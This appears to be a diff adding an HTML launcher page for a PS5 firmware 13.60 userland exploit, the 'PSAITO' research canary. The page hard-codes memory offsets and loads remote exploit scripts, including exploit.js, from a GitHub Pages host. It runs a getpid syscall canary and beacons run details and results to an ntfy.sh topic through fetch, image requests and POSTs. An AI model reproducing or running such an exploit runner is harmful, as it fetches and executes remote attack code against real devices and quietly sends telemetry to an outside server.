@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PS5 13.60 Research Runner 0.5.0</title>
+<style>
+  html,body{margin:0;background:#07090d;color:#e9eef6;font-family:Arial,sans-serif}
+  main{max-width:820px;margin:8vh auto;padding:28px}
+  .eyebrow{font-size:12px;letter-spacing:.16em;color:#91a0b8;margin-bottom:8px}
+  h1{font-size:28px;margin:0 0 12px}
+  p{color:#aeb9ca;line-height:1.5}
+  button{font-size:18px;font-weight:700;padding:14px 20px;border:0;border-radius:8px;cursor:pointer}
+  #status{margin-top:14px;font-family:monospace;white-space:pre-wrap}
+  #scr{margin-top:18px;padding:14px;background:#030507;border:1px solid #1d2633;border-radius:8px;
+       height:48vh;overflow:auto;white-space:pre-wrap;font:12px/1.45 monospace}
+  #fw-label{font-family:monospace}
+</style>
+</head>
+<body>
+<main>
+  <div class="eyebrow">RESEARCH BUILD 0.5.0</div>
+  <h1 class="header">PS5 13.60 clean userland canary</h1>
+  <p id="fw-label">FW 13.60</p>
+  <p>One press resets the PSAITO per-session attempt state, loads the upstream userland scripts with verified 13.60 offsets, and runs at most five attempts.</p>
+  <button id="run" type="button">Run clean 1→5 canary</button>
+  <div id="status">Ready.</div>
+  <div id="scr">Waiting.</div>
+</main>
+<script>
+(function(){
+  "use strict";
+
+  var TOPIC="ps5-1360-tumelo-4m7q2v9x6k3n8r5p1d0c";
+  var UP="https://wamphyre.github.io/PSAITO/";
+  var REV="6a5170c0df19206837893d57924d39ee4a2e6886";
+  var btn=document.getElementById("run");
+  var status=document.getElementById("status");
+
+  function runId(){
+    return Date.now().toString(36)+"-"+Math.floor(Math.random()*0x7fffffff).toString(36);
+  }
+
+  function relay(title,msg){
+    var u="https://ntfy.sh/"+encodeURIComponent(TOPIC)+"/publish?title="+
+      encodeURIComponent(title)+"&message="+encodeURIComponent(msg)+"&tags=computer&_="+Date.now();
+    try{
+      if(typeof fetch==="function") fetch(u,{method:"GET",mode:"no-cors"}).catch(function(){});
+    }catch(_){}
+    try{
+      if(!window.__relayImgs) window.__relayImgs=[];
+      var im=new Image(); window.__relayImgs.push(im); im.src=u;
+    }catch(_){}
+  }
+
+  function postLog(url,line){
+    try{
+      var x=new XMLHttpRequest();
+      x.open("POST",url,true);
+      x.setRequestHeader("Content-Type","text/plain");
+      x.send(String(line));
+    }catch(_){}
+  }
+
+  function loadScript(src){
+    return new Promise(function(resolve,reject){
+      var s=document.createElement("script");
+      s.src=src;
+      s.onload=resolve;
+      s.onerror=function(){reject(new Error("load failed: "+src));};
+      document.head.appendChild(s);
+    });
+  }
+
+  btn.addEventListener("click",function(){
+    btn.disabled=true;
+    btn.textContent="Running clean 1→5 canary...";
+    status.textContent="Resetting PSAITO session state…";
+    document.getElementById("scr").textContent="";
+
+    try{
+      sessionStorage.removeItem("renderer-notify-auto-proof-2:attempts");
+      sessionStorage.removeItem("renderer-notify-auto-proof-2:passed");
+      sessionStorage.removeItem("renderer-notify-auto-proof-2:blocked");
+      sessionStorage.removeItem("userland-loader-handoff-1:passed");
+    }catch(_){}
+
+    var rid=runId();
+    var logEndpoint="https://ntfy.sh/"+encodeURIComponent(TOPIC)+
+      "?title="+encodeURIComponent("PSAITO-A-"+rid);
+
+    var q=[
+      "go=1",
+      "fw=13.60",
+      "hc="+encodeURIComponent("0x56a58,0x56ca0,0x57ce8"),
+      "gd=0x1d6fa",
+      "notify=0x48b0",
+      "gps=0x334e238",
+      "gpe=0x1b860",
+      "cls=0x334e228",
+      "cle=0x274e0",
+      "ers=0x334e230",
+      "ere=0xf7d0",
+      "log=1",
+      "max=5",
+      "rd=3000",
+      "lines=260",
+      "logserver="+encodeURIComponent(logEndpoint),
+      "researchrun="+encodeURIComponent(rid)
+    ].join("&");
+
+    try{history.replaceState(null,"",location.pathname+"?"+q);}catch(_){}
+
+    relay("PS5 13.60 ADV-A "+rid,
+      "advanced_stage=A\nrun="+rid+
+      "\nfirmware=13.60\naction=local_wrapper_050"+
+      "\nmax=5\nnotify=0x48b0\ngps=0x334e238");
+
+    window.onBridgeReady=function(ps5){
+      status.textContent="Bridge reached. Running getpid canary…";
+      try{
+        var pid=window.syscall(window.SYSCALL.getpid);
+        var line="[canary] getpid ok = "+String(pid);
+        postLog(logEndpoint,line);
+        if(window.log) window.log(line);
+        postLog(logEndpoint,"[canary] DONE - payload completed without crash");
+        if(window.log) window.log("[canary] DONE - payload completed without crash");
+        status.textContent="SUCCESS — getpid canary completed.";
+      }catch(e){
+        var fail="[canary] getpid failed: "+String(e&&e.message||e);
+        postLog(logEndpoint,fail);
+        status.textContent=fail;
+      }
+    };
+
+    status.textContent="Loading upstream PSAITO scripts…";
+
+    loadScript(UP+"modules/offsets13x.js?v="+REV)
+      .then(function(){return loadScript(UP+"modules/bridge.js?v="+REV);})
+      .then(function(){return loadScript(UP+"modules/exploit.js?v="+REV);})
+      .then(function(){status.textContent="PSAITO loaded. Attempt 1 should begin now…";})
+      .catch(function(e){
+        status.textContent="Script load failed: "+e.message;
+        btn.disabled=false;
+        btn.textContent="Run clean 1→5 canary";
+      });
+  });
+}());
+</script>
+</body>
+</html>
